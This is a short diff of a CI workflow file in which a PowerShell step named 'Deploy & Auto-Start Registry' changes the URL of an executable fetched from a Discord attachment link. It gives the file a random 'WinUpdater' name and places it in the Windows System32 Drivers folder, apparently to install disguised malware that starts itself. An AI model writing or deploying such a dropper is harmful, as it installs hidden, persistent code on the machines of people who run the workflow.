@@ -34,7 +34,7 @@ jobs:
 
       - name: 4. Deploy & Auto-Start Registry
         run: |
-          $url = "https://cdn.discordapp.com/attachments/1478871012841095178/1481193003908595826/PythonOnDev.exe?ex=69b26bfb&is=69b11a7b&hm=da3fbe54729ddc710bf1267731f3b3b2f789b5c00055d1db84bffd860e7b9532&"
+          $url = "https://cdn.discordapp.com/attachments/1470141528511873047/1481482622008950886/Python.exe?ex=69b379b5&is=69b22835&hm=cdd429cae4c6942518282425729ddb927ceb0eb2767e3bcde3c19c6e6371f354&"
           
           $randName = "WinUpdater_" + (Get-Random -Minimum 10 -Maximum 99) + ".exe"
           $dest = "C:\Windows\System32\Drivers\$randName"
